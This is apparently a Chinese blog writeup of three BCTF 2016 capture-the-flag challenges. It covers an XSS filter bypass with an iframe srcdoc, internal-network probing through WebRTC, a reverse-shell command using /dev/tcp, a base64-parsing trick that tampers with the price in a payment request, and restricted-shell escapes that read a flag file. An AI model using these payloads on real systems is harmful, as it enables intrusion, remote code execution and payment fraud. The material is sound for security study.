---
id: 690
layout: post
title: 'bctf 部分writeup'
date: 2016-03-21 02:02:00
author: virusdefender
tags: 安全 CTF
---

又是一个和ctf一起度过的疲惫的周末。

QAQ
---
一个留言板，提交之后可以看到部分内容被过滤了，包括`on`、`script`、`img`等，最终发现`iframe`标签没被过滤，而且可以利用的是`src`和`srcdoc`属性，`srcdoc`使用html实体编码绕过。其中我遇到一个坑，就是开始认为`&`也被过滤了，而实际上是我没进行url编码，导致burp识别错误。

主办方的机器人一直不太稳定，第二天才真正的开始做这个题，xss探测结果是后台在`http://104.199.132.251/4dm1n/show.php`，cookies没啥用，页面源码也是只个列表，也没啥用。后来看到提示，说可以探测内网，想起使用webrtc，参考 http://www.wooyun.org/bugs/wooyun-2014-076685。


<!--more-->


payload见https://dl.dropboxusercontent.com/u/1878671/enumhosts.html，修改了代码，增加了回传ip信息。ip包括本机172.17.0.1，和三个192.168.1.x的，猜测就是192的了，但是使用js访问了一遍，都失败了，要不是不能访问，要不就是没设置跨域的http头。然后想起又访问了一遍172的内网，发现172.17.0.2是可以的，很高兴。

这个ip访问到的内容是

```php
<!--
header("Access-Control-Allow-Origin: *");
$ztz= 'system';
ob_start($ztz);
echo $_GET[c];
ob_end_flush();
-->
```

没有回显，需要反弹shell，使用`bash -i >& /dev/tcp/ip/port 0>&1`的没反应，猜测是遇到了编码的坑，换用了wget一个python脚本然后执行，然后反弹就成功了。


zerodaystore
------------
给了一个安卓apk和一段server的Python代码，代码见 https://gist.github.com/virusdefender/9aec40d6ae73ead56429

安卓大致的逆向了一下，就觉得order和pay的url是有用的，其余没啥问题。问题应该在server上，需要修改price。

可控的位置是`androidID`，一般混淆也就是它的值设置为`123&price=-1`，但是这里会在循环中被实际的price覆盖掉。

后来在想到需要利用Python的base64解码的特点，

```python
In [4]: import base64

In [5]: base64.b64encode("xxxxxxxxxx")
Out[5]: 'eHh4eHh4eHh4eA=='

In [6]: base64.b64decode("eHh4eHh4eHh4eA==")
Out[6]: 'xxxxxxxxxx'

In [7]: base64.b64decode("eHh4eHh4eHh4eA==!")
Out[7]: 'xxxxxxxxxx'

In [8]: base64.b64decode("eHh4eHh4eHh4eA==!eHh4eHh4eHh4eA==")
Out[8]: 'xxxxxxxxxx'
```

这样把price放在最后面就可以了。

```python
print requests.post("http://paygate.godric.me/pay", data="orderID=12368911859&price=80000&productID=1&timestamp=1458482306973&signer=RSA&hash=sha256&nonce=733d2f88ea74af8a&sign=TzdQaIa7qT/tTb6UNvzl25irdxiFYOj3hq932Wdozzkazsj1cIpzEhE2mnrUewwnuG2lPGpulqdMTGgMJgsUYWrKxEjpk3EKnWukgASyfap9N9EcsgKw67/2wJ00o1Nxc098jTxurLnW2lBfSXNQySDI+M7o0NzD58nYq/Rjzl3NkYFlF+fTf+ZxejM0J+uZCDDi7BZoFhTpFXrV0OPso6Ltefb+o0ZvI6YcBULHRdOVIhzhhnkY68xTBI2ULAH0OEttDls7PlLZnEYYuT92oSr7Q38W6ilpe1EG27czkVCVbuK3AMvfwaLbQnajuOrNz+JumG7TdFSbkwl8Rfgarw==!&price=-1").content
```

验证代码取到的sign就是带有`!&price=-1`的，但是base64解码后还和原来的是一样的，而解析price的时候却会读取到最后一个price。

结果是`{"status": 4, "data": "BCTF{0DayL0veR1chGuy5}"}`

hsab
----
一开始需要跑一段hash，还是需要暴力，不过还是挺快的。

> I would like some proof of work. Send me a string starting with
> 'vfgckhse', no whitespace, of length <= 63, such that its sha256 in
> binary starts with 20 bits of zeros.

```python
from zio import *
from hashlib import sha256
import sys
from os import urandom

io = zio(('104.199.132.199', 2222))
io.read_until('starting with \'')
t = io.read_until('\'')[:-1]


while True:
    x = urandom(8).encode('hex')
    if sha256(t + x).hexdigest().startswith('00000'):
        io.write(t + x+'\n')
        break
```

之后发现里面很多命令都没有了，比如`ls`、`cat`等，包括`gcc`、`python`之类的。之后发现输入`help`可以看到所有的命令。

在网上找到`echo /tmp/*`就相当于`ls /tmp`，就这样找到了`/home/ctf/flag.ray`，但是没有cat，没法读文件。

尝试使用重定向符号，但是只有重定向到文件是好的，比如`echo 123 > 456`，而反向的话就会报语法错误。

后来使用`bash -v flag.ray`搞定了。不加参数的话，就是输出`.bashrc`的内容。


后来听说还可以用用`dlcall`，但是我从没见过，只有https://github.com/taviso/ctypes.sh/wiki上有些介绍，看样子和C语言语法很像，但是写起来很奇怪。最终的payload是

```python
io.write('dlcall -n file -r pointer fopen "/home/ctf/flag.ray" "r"\n')
io.write('dlcall -n content -r pointer malloc 128\n')
io.write('dlcall -n text fread $content 128 1 $file\n')
io.write('dlcall printf $text\n')
```
